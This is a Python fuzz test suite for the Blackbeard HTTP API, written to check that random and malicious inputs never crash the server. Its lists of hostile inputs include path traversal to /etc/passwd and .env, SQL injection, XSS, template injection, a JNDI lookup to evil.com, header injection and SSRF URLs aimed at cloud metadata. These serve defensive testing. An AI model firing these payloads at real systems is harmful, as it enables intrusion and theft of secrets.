"""Fuzz / property-based tests for the Blackbeard HTTP API.

Uses Hypothesis to throw random, malicious, and edge-case inputs at every
public endpoint surface.  The invariant under test is always the same:

    **No input should ever produce a 500 Internal Server Error.**

We allow 200, 201, 400, 401, 403, 404, 409, 413, 422, 429, 504 — those are
all intentional rejections or successes.  A 500 means the server crashed on
attacker-controlled input and must be fixed.
"""

from __future__ import annotations

import json

import pytest
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from blackbeard.kinds import KIND_TO_PLURAL

# Re-use the shared fixtures (client, db_session, API_KEY_HEADER) from conftest.
from tests.conftest import API_KEY_HEADER

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _kind_plural(kind: str) -> str:
    """Map a Kind string (e.g. 'Agent') to its URL plural (e.g. 'agents')."""
    return KIND_TO_PLURAL[kind]


_ALL_KINDS = list(KIND_TO_PLURAL.keys())


# ---------------------------------------------------------------------------
# 1. Fuzz resource creation
# ---------------------------------------------------------------------------


@given(
    kind=st.sampled_from(_ALL_KINDS),
    name=st.text(min_size=0, max_size=300),
    spec=st.dictionaries(st.text(max_size=50), st.text(max_size=1000), max_size=20),
)
@settings(
    max_examples=200, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
)
async def test_fuzz_resource_creation(client, kind, name, spec):
    """No input should cause a 500.  Only proper status codes allowed."""
    body = {
        "apiVersion": "blackbeard/v1",
        "kind": kind,
        "metadata": {"name": name},
        "spec": spec,
    }
    resp = await client.post(
        f"/api/v1/{_kind_plural(kind)}",
        json=body,
        headers=API_KEY_HEADER,
    )
    assert resp.status_code in (200, 201, 400, 401, 403, 404, 409, 413, 422, 429), (
        f"Unexpected {resp.status_code} on POST /api/v1/{_kind_plural(kind)} "
        f"with name={name!r}, spec keys={list(spec.keys())}"
    )


# ---------------------------------------------------------------------------
# 2. Fuzz resource names (path traversal, injection, XSS, SSTI, JNDI, ...)
# ---------------------------------------------------------------------------

EVIL_NAMES = [
    "../../../etc/passwd",
    "'; DROP TABLE resources; --",
    "<script>alert(1)</script>",
    "name\x00with\x00nulls",
    "a" * 10_000,
    "",
    "../../../../.env",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "%00%0a%0d",
    "\r\nX-Injected: true",
    "admin\tadmin",
    "null",
    "undefined",
    "true",
    "false",
    "-1",
    "0",
]


@pytest.mark.parametrize("name", EVIL_NAMES)
async def test_evil_resource_names(client, name):
    """Malicious names should be rejected, never cause 500."""
    body = {
        "apiVersion": "blackbeard/v1",
        "kind": "Agent",
        "metadata": {"name": name},
        "spec": {"role": "x", "goal": "x", "backstory": "x"},
    }
    resp = await client.post("/api/v1/agents", json=body, headers=API_KEY_HEADER)
    assert resp.status_code != 500, f"500 on evil name: {name!r}"


# ---------------------------------------------------------------------------
# 3. Fuzz auth endpoints
# ---------------------------------------------------------------------------


@given(
    email=st.text(max_size=500),
    password=st.text(max_size=500),
)
@settings(
    max_examples=100, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
)
async def test_fuzz_login(client, email, password):
    """Login with random inputs should never 500."""
    resp = await client.post(
        "/api/v1/auth/login",
        json={"email": email, "password": password},
    )
    assert resp.status_code != 500, f"500 on login with email={email!r}"


@given(
    email=st.text(max_size=500),
    password=st.text(max_size=500),
    display_name=st.text(max_size=500),
)
@settings(
    max_examples=100, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
)
async def test_fuzz_register(client, email, password, display_name):
    """Register with random inputs should never 500."""
    resp = await client.post(
        "/api/v1/auth/register",
        json={"email": email, "password": password, "display_name": display_name},
    )
    assert resp.status_code != 500, f"500 on register with email={email!r}"


# ---------------------------------------------------------------------------
# 4. Fuzz execution kickoff inputs
# ---------------------------------------------------------------------------


@given(
    inputs=st.dictionaries(
        st.text(max_size=100),
        st.text(max_size=5000),
        max_size=50,
    ),
)
@settings(
    max_examples=100, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
)
async def test_fuzz_kickoff_inputs(client, inputs):
    """Kickoff with random inputs should never 500 (crew may not exist -> 404)."""
    resp = await client.post(
        "/api/v1/crews/nonexistent/kickoff",
        json={"inputs": inputs},
        headers=API_KEY_HEADER,
    )
    assert resp.status_code != 500, f"500 on kickoff with {len(inputs)} input keys"


# ---------------------------------------------------------------------------
# 5. Fuzz headers
# ---------------------------------------------------------------------------

EVIL_HEADERS = [
    {"X-API-Key": "a" * 100_000},
    {"Authorization": "Bearer " + "x" * 100_000},
    {"Content-Type": "text/xml"},
    {"X-API-Key": "\x00\x00\x00"},
    {"Authorization": "Basic dGVzdDp0ZXN0"},
    {"Authorization": "Bearer "},
    {"Authorization": "Bearer null"},
    {"X-API-Key": ""},
    {"X-Request-Id": "a" * 10_000},
    {"X-Request-Id": "../../../etc/passwd"},
]


@pytest.mark.parametrize("headers", EVIL_HEADERS)
async def test_evil_headers(client, headers):
    """Evil headers should not crash the server."""
    resp = await client.get("/api/v1/agents", headers=headers)
    assert resp.status_code != 500, f"500 with headers={headers}"


# ---------------------------------------------------------------------------
# 6. Fuzz marketplace import
# ---------------------------------------------------------------------------

EVIL_URLS = [
    "file:///etc/passwd",
    "ftp://evil.com/repo.git",
    "http://169.254.169.254/latest/meta-data/",
    "ssh://git@evil.com/repo.git",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "../../../.env",
    "",
    "a" * 10_000,
    "gopher://evil.com:25/",
    "dict://evil.com:11211/stat",
]


@pytest.mark.parametrize("url", EVIL_URLS)
async def test_evil_marketplace_urls(client, url):
    """Evil URLs should be rejected, never cause 500."""
    resp = await client.post(
        "/api/v1/marketplace/import",
        json={"url": url},
        headers=API_KEY_HEADER,
    )
    assert resp.status_code != 500, f"500 on marketplace import url={url!r}"
    # Should be a client error (rejected), not a success
    assert resp.status_code in (400, 401, 422, 504), (
        f"Expected client error for evil URL, got {resp.status_code}"
    )


# ---------------------------------------------------------------------------
# 7. Fuzz webhook creation
# ---------------------------------------------------------------------------


@given(
    url=st.text(max_size=2000),
    events=st.lists(st.text(max_size=100), max_size=20),
)
@settings(
    max_examples=100, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture]
)
async def test_fuzz_webhook_creation(client, url, events):
    """Webhook creation with random inputs should never 500."""
    resp = await client.post(
        "/api/v1/webhooks",
        json={"url": url, "events": events},
        headers=API_KEY_HEADER,
    )
    assert resp.status_code in (201, 400, 401, 403, 404, 409, 413, 422, 429), (
        f"Unexpected status {resp.status_code} on webhook create url={url!r}"
    )


# ---------------------------------------------------------------------------
# 8. Fuzz JSON body types
# ---------------------------------------------------------------------------

EVIL_BODIES: list = [
    None,
    "",
    "not json",
    42,
    [],
    True,
    {
        "nested": {
            "deep": {"very": {"deep": {"too": {"deep": {"way": {"too": {"deep": "value"}}}}}}}
        }
    },
    {"key": [None, True, 42, "string", [], {}]},
    [1, 2, 3],
    {"apiVersion": None, "kind": None, "metadata": None, "spec": None},
    {"apiVersion": 123, "kind": 456, "metadata": 789, "spec": 0},
]


@pytest.mark.parametrize("body", EVIL_BODIES)
async def test_evil_json_bodies(client, body):
    """Weird JSON bodies should not crash."""
    if body is None:
        content = ""
    elif isinstance(body, str) and body == "not json":
        content = body
    else:
        content = json.dumps(body)
    resp = await client.post(
        "/api/v1/agents",
        content=content,
        headers={**API_KEY_HEADER, "Content-Type": "application/json"},
    )
    assert resp.status_code != 500, f"500 on evil body: {body!r}"


# ---------------------------------------------------------------------------
# 9. Fuzz query parameters on list endpoints
# ---------------------------------------------------------------------------

EVIL_QUERY_PARAMS = [
    {"limit": "-1"},
    {"limit": "0"},
    {"limit": "999999999"},
    {"offset": "-1"},
    {"offset": "99999999999"},
    {"limit": "abc"},
    {"offset": "abc"},
    {"project": "../../../etc"},
    {"project": "'; DROP TABLE--"},
    {"label_selector": "a" * 10_000},
    {"label_selector": "key=val,=empty,noequals"},
]


@pytest.mark.parametrize("params", EVIL_QUERY_PARAMS)
async def test_evil_query_params(client, params):
    """Evil query parameters should not crash the server."""
    resp = await client.get("/api/v1/agents", params=params, headers=API_KEY_HEADER)
    assert resp.status_code != 500, f"500 with query params {params}"


# ---------------------------------------------------------------------------
# 10. Fuzz resource update (PUT) with evil payloads
# ---------------------------------------------------------------------------

EVIL_UPDATE_BODIES = [
    {},
    {"spec": None},
    {"spec": "not a dict"},
    {"spec": [], "version": -1},
    {"spec": {"role": "x"}, "version": 999_999_999},
    {"metadata": {"name": "../../../etc/passwd"}, "spec": {}},
    {"spec": {"role": "x"}, "version": "not-a-number"},
]


@pytest.mark.parametrize("body", EVIL_UPDATE_BODIES)
async def test_evil_update_bodies(client, body):
    """Evil update bodies should not crash the server."""
    resp = await client.put(
        "/api/v1/agents/nonexistent",
        json=body,
        headers=API_KEY_HEADER,
    )
    assert resp.status_code != 500, f"500 on PUT with body={body!r}"


# ---------------------------------------------------------------------------
# 11. Fuzz Content-Type variations
# ---------------------------------------------------------------------------

EVIL_CONTENT_TYPES = [
    "text/plain",
    "text/xml",
    "application/xml",
    "multipart/form-data",
    "application/x-www-form-urlencoded",
    "image/png",
    "",
    "application/json; charset=utf-16",
]


@pytest.mark.parametrize("content_type", EVIL_CONTENT_TYPES)
async def test_evil_content_types(client, content_type):
    """Non-JSON content types should be rejected, not crash."""
    resp = await client.post(
        "/api/v1/agents",
        content='{"test": true}',
        headers={**API_KEY_HEADER, "Content-Type": content_type},
    )
    assert resp.status_code != 500, f"500 with Content-Type: {content_type}"
